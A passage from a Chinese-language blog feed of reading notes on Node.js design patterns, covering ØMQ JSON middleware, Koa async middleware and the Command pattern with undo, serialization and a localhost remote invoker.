href="#A-middleware-to-support-JSON-messages-一个支持-JSON-消息的中间件" class="headerlink" title="A middleware to support JSON messages(一个支持 JSON 消息的中间件)"></a>A middleware to support JSON messages(一个支持 JSON 消息的中间件)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file jsonMiddleware.js</span></span><br><span class="line"><span class="built_in">module</span>.exports.json = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    inbound: <span class="function"><span class="keyword">function</span>(<span class="params">message, next</span>) </span>&#123;</span><br><span class="line">      message.data = <span class="built_in">JSON</span>.parse(message.data.toString())</span><br><span class="line">      next()</span><br><span class="line">    &#125;,</span><br><span class="line">    outbound: <span class="function"><span class="keyword">function</span>(<span class="params">message, next</span>) </span>&#123;</span><br><span class="line">      message.data = <span class="keyword">new</span> Buffer(<span class="built_in">JSON</span>.stringify(message.data))</span><br><span class="line">      next()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要使用的时候只需要 <code>use(jsonMiddleware)</code> 就行了，很方便。</p><h4 id="Using-the-OMQ-middleware-framework-使用-OMQ-中间件框架"><a href="#Using-the-OMQ-middleware-framework-使用-OMQ-中间件框架" class="headerlink" title="Using the ØMQ middleware framework(使用 ØMQ 中间件框架)"></a>Using the ØMQ middleware framework(使用 ØMQ 中间件框架)</h4><h5 id="The-server"><a href="#The-server" class="headerlink" title="The server"></a>The server</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> zmq = <span class="built_in">require</span>(<span class="string">'zmq'</span>)</span><br><span class="line"><span class="keyword">const</span> ZmqMiddlewareManager = <span class="built_in">require</span>(<span class="string">'./zmqMiddlewareManager'</span>)</span><br><span class="line"><span class="keyword">const</span> jsonMiddleware = <span class="built_in">require</span>(<span class="string">'./jsonMiddleware'</span>)</span><br><span class="line"><span class="keyword">const</span> reply = zmq.socket(<span class="string">'rep'</span>)</span><br><span class="line">reply.bind(<span class="string">'tcp://127.0.0.1:5000'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> zmqm = <span class="keyword">new</span> ZmqMiddlewareManager(reply)</span><br><span class="line">zmqm.use(jsonMiddleware.json())</span><br></pre></td></tr></table></figure><h5 id="The-client"><a href="#The-client" class="headerlink" title="The client"></a>The client</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> zmq = <span class="built_in">require</span>(<span class="string">'zmq'</span>)</span><br><span class="line"><span class="keyword">const</span> ZmqMiddlewareManager = <span class="built_in">require</span>(<span class="string">'./zmqMiddlewareManager'</span>)</span><br><span class="line"><span class="keyword">const</span> jsonMiddleware = <span class="built_in">require</span>(<span class="string">'./jsonMiddleware'</span>)</span><br><span class="line"><span class="keyword">const</span> request = zmq.socket(<span class="string">'req'</span>)</span><br><span class="line">request.connect(<span class="string">'tcp://127.0.0.1:5000'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> zmqm = <span class="keyword">new</span> ZmqMiddlewareManager(request)</span><br><span class="line">zmqm.use(jsonMiddleware.json())</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理服务器响应的中间件</span></span><br><span class="line">zmqm.use(&#123;</span><br><span class="line">  inbound: <span class="function"><span class="keyword">function</span>(<span class="params">message, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Echoed back: '</span>, message.data)</span><br><span class="line">    next()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  zmqm.send(&#123;</span><br><span class="line">    action: <span class="string">'ping'</span>,</span><br><span class="line">    echo: <span class="built_in">Date</span>.now()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h3 id="Middleware-using-generators-in-Koa-在-Koa-中使用生成器中间件"><a href="#Middleware-using-generators-in-Koa-在-Koa-中使用生成器中间件" class="headerlink" title="Middleware using generators in Koa(在 Koa 中使用生成器中间件)"></a>Middleware using generators in Koa(在 Koa 中使用生成器中间件)</h3><p><code>Koa</code> 不像 <code>Express</code> 一样使用回调函数来完成中间件模式，而是使用生成器(<code>generator</code>)，使用中间件包装核心应用程序，这种形式更像是洋葱一样：</p><p><img src="/assets/img/koa_middleware.png" alt="Koa Middleware"></p><p>我们来看一个官方的例子(<code>ES7</code>)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line"></span><br><span class="line"><span class="comment">// x-response-time</span></span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> start = <span class="built_in">Date</span>.now()</span><br><span class="line">  <span class="keyword">await</span> next()</span><br><span class="line">  <span class="keyword">const</span> ms = <span class="built_in">Date</span>.now() - start</span><br><span class="line">  ctx.set(<span class="string">'X-Response-Time'</span>, <span class="string">`<span class="subst">$&#123;ms&#125;</span>ms`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// logger</span></span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> start = <span class="built_in">Date</span>.now()</span><br><span class="line">  <span class="keyword">await</span> next()</span><br><span class="line">  <span class="keyword">const</span> ms = <span class="built_in">Date</span>.now() - start</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;ctx.method&#125;</span> <span class="subst">$&#123;ctx.url&#125;</span> - <span class="subst">$&#123;ms&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// response</span></span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = <span class="string">'Hello World'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>可以发现 <code>response</code> 部分才是核心应用程序部分，只不过被其他的中间件包裹起来了，通过 <code>await</code> 分割。</p><blockquote><p>注意，现在 <code>Koa</code> 已经开始使用 <code>ES7</code> 的语法 <code>async</code>/<code>await</code> 了，详情查看<a href="https://koajs.com" target="_blank" rel="noopener">官方文档</a>。</p></blockquote><h2 id="Command-命令模式"><a href="#Command-命令模式" class="headerlink" title="Command(命令模式)"></a>Command(命令模式)</h2><p>可以认为一个命令(<code>Command</code>)是一个封装了重要的信息以便之后去执行一个特定的动作的对象。我们不直接在主体对象上调用一个方法或一个函数，而是创建一个对象来执行这样一次调用；而实现这个意图将是另一个组件的责任，该组件将意图转化为一系列操作。</p><p><img src="/assets/img/command.png" alt="Command"></p><p>命令模式典型的架构：</p><ul><li><code>Command</code>:这是一个封装了足够的信息去调用方法或函数的对象，就像是定义了一个接口。</li><li><code>Client</code>:创建命令对象并提供给调用者(<code>Invoker</code>)。</li><li><code>Invoker</code>:负责执行目标(<code>Target</code>)上的命令，负责调用 <code>Command</code>。</li><li><code>Target</code>(或 <code>Receiver</code>):调用的主体，它可以是一个对象上的单独的方法或函数。</li></ul><p>命令模式有点：</p><ul><li>命令可以稍后执行。</li><li>命令可以被序列化并在网络上传输。这使得我们可以远程分配任务，通过浏览器传输命令给服务器，创建 <code>RPC</code> 系统等等。</li><li>很容易记录操作历史。</li><li>命令是数据同步和冲突解决某些算法的重要部分。</li><li>定时执行的命令可以取消；命令也可以撤销(<code>undone</code>)。</li><li>命令可以组合起来，用来创建原子事务或实现同时执行一些操作的机制。</li><li>一组命令可以有不同的变化，例如可以删除、插入、分割等等。</li></ul><h3 id="A-flexible-pattern-一个灵活的模式"><a href="#A-flexible-pattern-一个灵活的模式" class="headerlink" title="A flexible pattern(一个灵活的模式)"></a>A flexible pattern(一个灵活的模式)</h3><p>正如上面所说，命令模式可以有很多种实现方式，我们来看看其中几个。</p><h4 id="A-task-pattern-任务模式"><a href="#A-task-pattern-任务模式" class="headerlink" title="A task pattern(任务模式)"></a>A task pattern(任务模式)</h4><p>最简单的方式就是创建一个闭包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createTask</span>(<span class="params">target, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    target.apply(<span class="literal">null</span>, args)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种技术允许我们使用单独的组件来控制和调度任务的执行，这在本质上等同于命令模式的调用者(<code>Invoker</code>，其实是同时创建了命令(<code>Command</code>))。</p><h4 id="A-more-complex-command-一个更复杂的命令"><a href="#A-more-complex-command-一个更复杂的命令" class="headerlink" title="A more complex command(一个更复杂的命令)"></a>A more complex command(一个更复杂的命令)</h4><p>我们希望撤销和序列化。命令的目标(<code>Target</code>) 是一个负责发送状态更新的对象:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> statusUpdateService = &#123;</span><br><span class="line">  statusUpdates: &#123;&#125;,</span><br><span class="line">  sendUpdate: <span class="function"><span class="keyword">function</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Status sent: '</span> + status)</span><br><span class="line">    <span class="keyword">let</span> id = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">1000000</span>)</span><br><span class="line">    statusUpdateService.statusUpdates[id] = status</span><br><span class="line">    <span class="keyword">return</span> id</span><br><span class="line">  &#125;,</span><br><span class="line">  destroyUpdate: <span class="function"><span class="params">id</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Status removed: '</span> + id)</span><br><span class="line">    <span class="keyword">delete</span> statusUpdateService.statusUpdates[id]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着创建一个命令来新状态的发布：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createSendStatusCmd</span>(<span class="params">service, status</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> postId = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">const</span> command = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    postId = service.sendUpdate(status)</span><br><span class="line">  &#125;</span><br><span class="line">  command.undo = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (postId) &#123;</span><br><span class="line">      service.destroyUpdate(postId)</span><br><span class="line">      postId = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  command.serialize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      type: <span class="string">'status'</span>,</span><br><span class="line">      action: <span class="string">'post'</span>,</span><br><span class="line">      status: status</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> command</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>command</code> 本身是一个函数，使用目标的方法发送状态更新，附在上面的 <code>undo</code> 函数直接调用目标的 <code>destroyUpdate</code> 函数来完成命令撤销，<code>serialize</code> 函数构建了一个 <code>JSON</code> 对象记录执行命令所需要的重要信息。</p><p>然后再来创建执行者 <code>Invoker</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoker</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.history = []</span><br><span class="line">  &#125;</span><br><span class="line">  run(cmd) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.push(cmd)</span><br><span class="line">    cmd()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Command executed'</span>, cmd.serialize())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行者还可以做一些额外的操作，如记录命令的执行，远程调用，延迟执行命令，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoker</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.history = []</span><br><span class="line">  &#125;</span><br><span class="line">  run(cmd) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.push(cmd)</span><br><span class="line">    cmd()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Command executed'</span>, cmd.serialize())</span><br><span class="line">  &#125;</span><br><span class="line">  delay(cmd, delay) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.run(cmd)</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">  runRemotely(cmd) &#123;</span><br><span class="line">    request.post(</span><br><span class="line">      <span class="string">'http://localhost:3000/cmd'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        json: cmd.serialize()</span><br><span class="line">      &#125;,</span><br><span class="line">      err =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Command executed remotely'</span>, cmd.serialize())</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后编写客户端(<code>Client</code>):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> invoker = <span class="keyword">new</span> Invoker()</span><br><span class="line"><span class="keyword">const</span> command = createSendStatusCmd(statusUpdateService, <span class="string">'HI!'</span>)</span><br><span class="line">invoker.run(command)</span><br><span class="line">invoker.runRemotely(command)</span><br></pre></td></tr></table></figure><blockquote><p>命令模式最好在需要一些复杂的代码来调用目标上的函数或方法时使用，不然只是简单地调用一个方法就显得非常多余了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Design-Patterns-设计模式&quot;&gt;&lt;a href=&quot;#Design-Patterns-设计模式&quot; class=&quot;headerlink&quot; title=&quot;Design Patterns(设计模式)&quot;&gt;&lt;/a&gt;Design Patterns(设计模式)&lt;/h1&gt;&lt;h2 id=&quot;Factory-工厂&quot;&gt;&lt;a href=&quot;#Factory-工厂&quot; class=&quot;headerlink&quot; title=&quot;Factory(工厂)&quot;&gt;&lt;/a&gt;Factory(工厂)&lt;/h2&gt;&lt;h3 id=&quot;A-generic-interface-for-creating-objects-创建对象的通用接口&quot;&gt;&lt;a href=&quot;#A-generic-interface-for-creating-objects-创建对象的通用接口&quot; class=&quot;headerlink&quot; title=&quot;A generic interface for creating objects(创建对象的通用接口)&quot;&gt;&lt;/a&gt;A generic interface for creating objects(创建对象的通用接口)&lt;/h3&gt;&lt;p&gt;调用一个工厂，而不是直接使用 &lt;code&gt;new&lt;/code&gt; 运算符或 &lt;code&gt;Object.create()&lt;/code&gt; 从一个原型创建一个新的对象，在很多方面是非常方便和灵活的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://1016990109.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="设计模式" scheme="http://1016990109.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
</feed>
